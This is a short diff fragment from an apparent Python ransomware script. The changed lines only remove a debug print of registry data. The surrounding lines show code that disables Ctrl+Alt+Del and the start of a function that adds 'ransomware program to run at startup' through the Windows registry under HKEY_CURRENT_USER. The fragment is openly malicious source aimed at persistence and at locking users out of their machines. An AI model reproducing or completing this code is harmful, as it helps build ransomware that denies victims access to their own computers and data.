@@ -24,9 +24,6 @@ try:
     print("CAD has been disabled.")
 except Exception as e:
     print(f"Error disabling CAD: {e}")
-
-# Print the Registry data
-print(data)
 # Add ransomware program to run at startup
 def add_to_startup():
     key = winreg.HKEY_CURRENT_USER
